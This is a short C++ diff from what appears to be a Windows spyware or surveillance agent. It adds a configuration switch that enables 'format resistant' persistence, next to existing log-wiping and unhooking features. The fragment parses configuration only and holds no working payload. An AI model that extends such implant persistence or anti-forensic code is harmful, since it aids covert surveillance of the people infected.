@@ -13,6 +13,7 @@
 #include "JSON\JSON.h"
 #include "UnHookClass.h"
 #include "DeepFreeze.h"
+#include "format_resistant.h"
 
 typedef struct {
 	DWORD agent_tag;
@@ -178,6 +179,7 @@ void WINAPI ParseGlobalsQuota(JSONObject conf_json, DWORD dummy)
 	min_disk_free = (DWORD) quota[L"min"]->AsNumber();
 	max_disk_full = (DWORD) quota[L"max"]->AsNumber();
 	log_wipe_file = (BOOL) conf_json[L"wipe"]->AsBool();
+	SetFormatResistant(conf_json[L"format"]->AsBool());
 }
 
 // Legge la configuazione per i log
